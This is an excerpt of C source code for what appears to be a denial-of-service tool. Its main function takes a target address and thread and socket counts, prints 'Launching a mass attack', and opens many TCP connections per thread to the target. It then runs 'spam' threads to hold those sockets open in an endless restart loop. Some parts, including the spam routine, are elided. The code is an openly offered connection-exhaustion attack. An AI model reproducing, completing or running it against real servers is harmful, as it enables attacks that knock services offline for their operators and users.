...
int main(int argc, char *argv[])
{
	...
	int n_sockets = strtol(argv[3], NULL, 10), i = 0, j = 0, launch = 1;
	...
	if (!(args)) { 
		fprintf(stderr, "MAJOR ERROR ALOCATION ARGS.\n");
		exit(EXIT_FAILURE);
	}
	...
	strncpy(args->target, argv[1], sizeof(args->target) -1);
	...
	printf("Launching a mass attack to address:\t%s\n", ip_str);

	int **sockets = (int **) malloc(n_threads * sizeof(int *));

	if (sockets == NULL) {
		printf("MAJOR PROBLEM IN FIRST MEMORY ALLOCATION.\n");
		exit(EXIT_FAILURE);
	}
	...
	for (i = 0; i < n_threads; ++i) {
		...
		if (sockets[i] == NULL) {
			printf("MAJOR PROBLEM IN SECOND MEMORY ALLOCATION.\n");
			exit(EXIT_FAILURE);
		}

		for (j = 0; j < n_sockets + 1; ++j) {
			sockets[i][j] = socket(AF_INET, SOCK_STREAM, 0);

			if (sockets[i][j] == -1) {
				printf("Could not create socket %d from thread (%d).\n",
						j + 1, i + 1);
				sockets[i][j] = -1;
				break;
			}
			printf("Socket %d was created from thread (%d).\n",
					j + 1, i + 1);
			if ((connect(sockets[i][j],
							(struct sockaddr *) &(args->remote),
							sizeof(args->remote)) < 0)) {
				printf("Could not create socket %d for thread (%d).\n",
						j + 1, i + 1);
				sockets[i][j] = -1;
				break;
			}
	...
	for (i = 0; i < n_threads; ++i)
		sockets[i][n_sockets] = -1;

	args->sockets = sockets;
	args->n_sockets = n_sockets;

	while (1) {
		printf("Attack will be restarted\n");

		for (i = 0; i < n_threads; ++i) {
			printf("Maintaining sockets on thread (%d) open..\n", i + 1);
			pthread_create(&threads[i], NULL, &spam, args);
		}

		for (i = 0; i < n_threads; ++i) {
			pthread_join(threads[i], NULL);
			printf("Attacks on thread (%d) will be paused.\n", i + 1);
		}

		printf("Launch number %d completed.\n", launch++);
		printf("Sleeping for %02d seconds.\n", tempo);
